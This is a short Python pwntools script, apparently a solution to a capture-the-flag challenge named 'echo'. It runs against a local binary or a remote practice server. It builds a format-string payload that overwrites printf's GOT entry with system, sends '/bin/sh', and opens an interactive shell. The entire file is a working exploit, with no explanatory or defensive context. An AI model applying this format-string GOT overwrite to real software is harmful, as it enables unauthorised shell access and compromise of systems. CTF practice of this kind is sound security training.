#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./echo')
			#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
			elf=ELF('./echo')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',26308)
			elf=ELF('echo')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		
		pay=fmtstr_payload(7,{elf.got['printf']:elf.plt['system']})
		io.sendline(pay)
		io.recv()
		io.sendline('/bin/sh\x00')



		io.interactive()


	#except Exception as e:
		#raise e
	#else:
		#pass